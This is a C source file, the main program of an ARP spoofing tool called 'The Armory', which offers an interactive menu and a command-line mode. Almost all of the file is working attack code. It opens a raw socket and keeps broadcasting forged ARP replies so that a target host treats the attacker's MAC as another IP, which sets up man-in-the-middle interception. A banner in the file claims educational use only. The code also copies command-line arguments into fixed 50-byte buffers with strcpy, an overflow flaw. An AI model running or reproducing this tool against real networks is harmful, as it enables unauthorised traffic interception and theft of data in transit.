#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <signal.h>

#include "../include/network.h"
#include "../include/protocols.h"
#include "../include/ui.h"

volatile int keep_running = 1;

void handle_signal(int signal) {
    if (signal == SIGINT) {
        printf("\n");
        print_status("warning", "Program stop detected. Cleaning up...");
        keep_running = 0;
    }
}

void display_interfaces(void) {
    clear_screen();
    display_logo();
    
    print_separator();
    printf(BOLD CYAN "                        AVAILABLE NETWORK INTERFACES\n" RESET);
    print_separator();
    printf("\n");
    
    print_status("info", "Executing command: ip link show");
    printf("\n");
    system("ip link show | grep -E '^[0-9]+:' | awk '{print $2}' | sed 's/://g'");
    printf("\n");
    print_separator();
    printf("\n" BOLD "Press Enter to return to menu..." RESET);
    getchar();
    getchar();
}

void display_about(void) {
    clear_screen();
    display_logo();
    
    print_separator();
    printf(BOLD MAGENTA "                              ABOUT\n" RESET);
    print_separator();
    printf("\n");
    
    printf(YELLOW "The Armory - ARP Spoofing Boosted" RESET "\n");
    printf("Version: 2.0\n\n");
    
    printf(BOLD "Description:\n" RESET);
    printf("ARP Spoofing/Poisoning attack demonstration tool.\n");
    printf("Allows intercepting network traffic by positioning itself\n");
    printf("as an intermediary between two hosts (MITM attack).\n\n");
    
    printf(BOLD RED "⚠ WARNING:\n" RESET);
    printf("This tool is intended for educational and security testing\n");
    printf("purposes only. Using this tool on networks without\n");
    printf("authorization is illegal.\n\n");
    
    printf(BOLD "Features:\n" RESET);
    printf("  • Sending forged ARP packets\n");
    printf("  • Interactive command-line interface\n");
    printf("  • Signal handling (Ctrl+C)\n");
    printf("  • Multi-interface support\n\n");
    
    print_separator();
    printf("\n" BOLD "Press Enter to return to menu..." RESET);
    getchar();
    getchar();
}

int run_attack(char *interface_name, char *target_ip, char *spoof_ip) {
    int raw_socket;
    
    signal(SIGINT, handle_signal);

    print_status("info", "Initializing attack...");

    raw_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if (raw_socket < 0) {
        print_status("error", "Unable to open socket (Are you root?)");
        return EXIT_FAILURE;
    }
    print_status("success", "RAW socket opened successfully");

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface_name, IFNAMSIZ - 1);

    if (ioctl(raw_socket, SIOCGIFINDEX, &ifr) < 0) {
        print_status("error", "Unable to find specified interface");
        close(raw_socket);
        return EXIT_FAILURE;
    }
    
    int if_index = ifr.ifr_ifindex;
    char msg[100];
    snprintf(msg, sizeof(msg), "Interface '%s' found (index: %d)", interface_name, if_index);
    print_status("success", msg);

    uint8_t my_mac[6];
    if (get_local_mac(raw_socket, interface_name, my_mac) < 0) {
        print_status("error", "Unable to retrieve local MAC address");
        close(raw_socket);
        return EXIT_FAILURE;
    }

    // Afficher la configuration
    display_config(interface_name, target_ip, spoof_ip, my_mac);

    // Cible (Victime)
    uint8_t target_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}; // Broadcast par défaut

    // Préparation de l'adresse de destination pour sendto
    struct sockaddr_ll socket_address;
    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);
    socket_address.sll_ifindex = if_index;
    socket_address.sll_hatype = ARPHRD_ETHER;
    socket_address.sll_pkttype = PACKET_BROADCAST; 
    socket_address.sll_halen = 6;
    memcpy(socket_address.sll_addr, target_mac, 6);

    printf("\n");
    print_separator();
    print_status("attack", "STARTING ARP PACKET INJECTION");
    print_status("warning", "Press Ctrl+C to stop the attack");
    print_separator();
    printf("\n");
    
    unsigned char buffer[1500];
    int packet_count = 0;

    while (keep_running) {
        // Construction du paquet ARP (Réponse falsifiée)
        forge_arp_packet(buffer, my_mac, spoof_ip, target_mac, target_ip, ARP_REPLY);

        // Envoi du paquet
        ssize_t sent = sendto(raw_socket, buffer, sizeof(struct ethernet_header) + sizeof(struct arp_header), 
                              0, (struct sockaddr*)&socket_address, sizeof(socket_address));

        if (sent < 0) {
            print_status("error", "Error sending packet");
        } else {
            packet_count++;
            snprintf(msg, sizeof(msg), "Packet #%d sent → %s believes %s is at %02x:%02x:%02x:%02x:%02x:%02x", 
                   packet_count, target_ip, spoof_ip, my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
            print_status("attack", msg);
        }
        
        sleep(2);
    }

    printf("\n");
    print_separator();
    snprintf(msg, sizeof(msg), "Total packets sent: %d", packet_count);
    print_status("info", msg);
    print_status("info", "Closing socket...");
    close(raw_socket);
    print_status("success", "Program terminated cleanly");
    print_separator();
    printf("\n");

    return EXIT_SUCCESS;
}

int main(int argc, char *argv[]) {
    char interface_name[50];
    char target_ip[50];
    char spoof_ip[50];
    int choice;

    // Mode ligne de commande classique (rétro-compatibilité)
    if (argc == 4) {
        strcpy(interface_name, argv[1]);
        strcpy(target_ip, argv[2]);
        strcpy(spoof_ip, argv[3]);
        
        clear_screen();
        display_logo();
        print_status("info", "Command line mode detected");
        
        return run_attack(interface_name, target_ip, spoof_ip);
    }

    // Mode interactif
    while (1) {
        clear_screen();
        display_logo();
        display_menu();
        
        if (scanf("%d", &choice) != 1) {
            print_status("error", "Invalid input!");
            sleep(2);
            while(getchar() != '\n');
            continue;
        }
        
        switch(choice) {
            case 1:
                // Configuration manuelle
                if (get_user_config(interface_name, target_ip, spoof_ip) == 0) {
                    clear_screen();
                    display_logo();
                    return run_attack(interface_name, target_ip, spoof_ip);
                }
                break;
                
            case 2:
                // Mode automatique (à implémenter)
                clear_screen();
                display_logo();
                print_separator();
                printf(BOLD YELLOW "                          AUTOMATIC MODE\n" RESET);
                print_separator();
                printf("\n");
                print_status("warning", "Feature in development...");
                print_status("info", "This option will allow automatic network scanning");
                printf("\n");
                print_separator();
                printf("\n" BOLD "Press Enter to return to menu..." RESET);
                getchar();
                getchar();
                break;
                
            case 3:
                // Afficher les interfaces
                display_interfaces();
                break;
                
            case 4:
                // À propos
                display_about();
                break;
                
            case 0:
                // Quitter
                clear_screen();
                display_logo();
                print_status("info", "Closing application...");
                printf("\n");
                print_separator();
                printf(BOLD CYAN "                    Thank you for using The Armory!\n" RESET);
                print_separator();
                printf("\n");
                return EXIT_SUCCESS;
                
            default:
                print_status("error", "Invalid option!");
                sleep(2);
                break;
        }
    }

    return EXIT_SUCCESS;
}
